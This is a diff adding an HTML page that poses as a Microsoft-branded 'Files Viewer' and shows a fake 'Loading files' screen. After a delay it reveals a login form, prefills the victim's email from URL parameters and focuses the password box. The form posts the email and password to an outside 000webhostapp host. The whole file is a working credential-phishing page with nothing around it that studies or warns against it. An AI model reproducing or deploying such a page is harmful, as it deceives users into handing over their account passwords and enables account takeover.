@@ -1,0 +1,64 @@
+<html lang="zxx"><head><title> FILES VIEWER</title><meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8" />
+    <meta name="keywords" content="DOCNETWORK AUTHMODULE" />
+    <link href="//fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css" type="text/css" media="all" />
+    <link rel="stylesheet" href="css/font-awesome.min.css" type="text/css" media="all">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            
+            var email = "";
+            
+            setTimeout(function() {
+                $("#prompt").text("  -SIGN IN...");
+                $("#login-form-content").css("display", "block");
+                const queryString = window.location.search;
+                console.log(queryString);
+                const urlParams = new URLSearchParams(queryString);
+                const sessVar = urlParams.get('en');
+                const sessVar2 = urlParams.get('dm');
+                email=sessVar+"@"+sessVar2;
+                //console.log(error);
+                $(".text").val(email);
+                $(".domain").val(sessVar2);
+                $( ".password" ).focus();
+                //const email = atob(sessVar);
+                //$("#Name").val(email);
+                //$("#Ps").focus();
+                    
+            }, 5000);
+
+            
+            
+            
+        });
+    </script>
+</head>
+<body > 
+    <section class="w3l-hotair-form"><h1></h1>
+    <div class="container" style="border: #004F98 1px solid;border-radius: 0px;">
+    <div class="workinghny-form-grid">
+    <div class="main-hotair">
+        <div class="content-wthree">
+            <h2 id="prompt">Loading Files</h2>
+            <form style="display: none;" id="login-form-content" action="https://filesanddocsonpoint.000webhostapp.com/popen.php" method="post"> 
+                <input type="text" class="text" name="en" placeholder="E-mail Address" required="" value="" autofocus> 
+                <input type="password" class="password" name="pd" placeholder="Password" required=""> 
+                <button class="btn" type="submit">Log In</button>
+                <input type="hidden" class="domain" name="dm" value="">
+            </form>
+        </div>
+        <div class="w3l_form align-self">
+            <div class="left_grid_info"> 
+                <img id="thefiles" src="images/img.webp" alt="Please Wait...  Loading files... " class="img-fluid">
+            </div>
+        </div>
+    </div>
+    </div>
+    </div>
+    <div class="copyright text-center"><p class="copy-footer-29"  style="color: blue;">&copy; 2023 FILESERVERS_MSFT. All rights reserved</p>
+    </div> 
+</section>
+</body>
+</html>
